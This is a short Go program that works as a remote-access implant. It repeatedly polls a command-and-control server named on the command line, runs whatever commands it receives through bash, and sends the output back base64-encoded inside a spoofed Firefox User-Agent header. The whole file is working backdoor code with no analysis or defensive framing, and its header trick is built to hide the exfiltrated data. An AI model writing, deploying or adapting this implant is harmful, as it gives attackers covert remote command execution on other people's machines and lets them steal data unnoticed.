package main

import (
  "encoding/base64"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
  "os"
  "os/exec"
)

func main() {
  args := os.Args
  if len(args) < 3 {
    log.Fatal("Usage Error\n" + args[0] + " www.c2server.ml secret-key")
  }
  key := args[2]
  url := "http://" + args[1] + "/?key=" + key
  for {
    command := makeRequest(url)
    output := execCommand(command)
    sendResponse(url, output)
  }
}

func makeRequest(url string) string {
  resp, err := http.Get(url)
  if err != nil {
    fmt.Println(err)
  }
  content, err := ioutil.ReadAll(resp.Body)
  resp.Body.Close()
  if err != nil {
    fmt.Println(err)
  }
  return string(content)
}

func execCommand(cmd string) []byte {
  output, err := exec.Command("bash", "-c", cmd).Output()
  if err != nil {
    fmt.Println(err)
  }
  return output
}

func Encode(data []byte) string {
  encodedString := base64.StdEncoding.EncodeToString(data)
  return encodedString
}

func sendResponse(url string, content []byte) {
  client := &http.Client{}
  req, err := http.NewRequest("GET", url, nil)
  if err != nil {
    fmt.Println(err)
  }
  req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0|"+Encode(content))
  _, err = client.Do(req)
  if err != nil {
    fmt.Println(err)
  }
}

